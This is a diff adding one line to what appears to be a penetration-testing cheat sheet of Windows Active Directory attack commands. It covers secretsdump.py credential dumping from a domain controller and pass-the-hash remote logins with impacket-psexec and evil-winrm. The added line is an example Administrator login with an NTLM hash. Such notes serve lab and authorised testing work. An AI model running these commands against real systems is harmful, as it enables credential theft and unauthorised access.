@@ -753,6 +753,7 @@ python secretsdump.py -no-pass -just-dc <domain>/'DC_NETBIOS_NAME$'@<dc-ip>
 # e.g., python secretsdump.py -no-pass -just-dc test.local/'USER01$'@10.10.10.168
 # remote login
 impacket-psexec "<username>":@<target ip> -hashes "<NTLM hash>"
+# e.g., impacket-psexec "Administrator":@10.10.10.10 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
 # default 5989 port
 evil-winrm -i <target ip> -u <username> -H '<NTLM hash>'
 ```
